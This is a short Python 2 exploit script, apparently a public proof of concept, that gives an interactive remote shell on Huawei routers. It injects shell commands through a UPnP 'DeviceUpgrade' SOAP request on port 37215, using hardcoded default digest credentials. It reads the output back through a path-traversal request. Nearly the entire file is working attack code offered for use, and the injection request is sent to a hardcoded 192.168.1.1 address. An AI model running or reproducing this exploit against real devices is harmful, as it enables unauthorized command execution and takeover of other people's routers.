#!/bin/python
'''
    Author : Rebellion
    Github : @rebe11ion
    Twitter : @rebellion
'''

import urllib2,requests,os,sys
from requests.auth import HTTPDigestAuth
DEFAULT_HEADERS = {"User-Agent": "Mozilla", }
DEFAULT_TIMEOUT = 5
def fetch_url(url):
    global DEFAULT_HEADERS, DEFAULT_TIMEOUT
    request = urllib2.Request(url, headers=DEFAULT_HEADERS)
    data = urllib2.urlopen(request, timeout=DEFAULT_TIMEOUT).read()
    return data

def exploit(ip, path):
    url = "http://%s:37215/icon/../../../%s" % (ip, path)
    data = fetch_url(url)
    return data

def main():
    pwd = "/"
    cmd_path = "/tmp/ccmd"
    pwd_path = "/tmp/cpwd"
    while True:
       targetip = sys.argv[1]
       cmd_ = raw_input("[{}]$ ".format(pwd))
       cmd = "cd {} ; {} > {} ; pwd > {}".format(pwd,cmd_.split("|")[0],cmd_path,pwd_path)
       rm = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$(" + cmd + ")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"
       url = "http://192.168.1.1:37215/ctrlt/DeviceUpgrade_1"
       requests.post(url, auth=HTTPDigestAuth('dslf-config', 'admin'), data=rm)
       assert cmd_path.startswith("/"), "An absolute path is required"
       data = exploit(targetip, cmd_path)
       open(cmd_path,"wb").write(data)
       if "cd" in cmd_:
          pass
       elif "clear" in cmd_:
          os.system("clear")
       elif "cat" in cmd_:
          os.system(cmd_.replace(cmd_.split("cat")[1].split(" ")[1],cmd_path))
       else:
          if "|" in cmd_:
             os.system("cat {} | {}".format(cmd_path,cmd_.split("|")[1]))
          else:
             os.system("cat {}".format(cmd_path))
       pwd = exploit(targetip,pwd_path).strip("\n")

if __name__ == "__main__":
    main()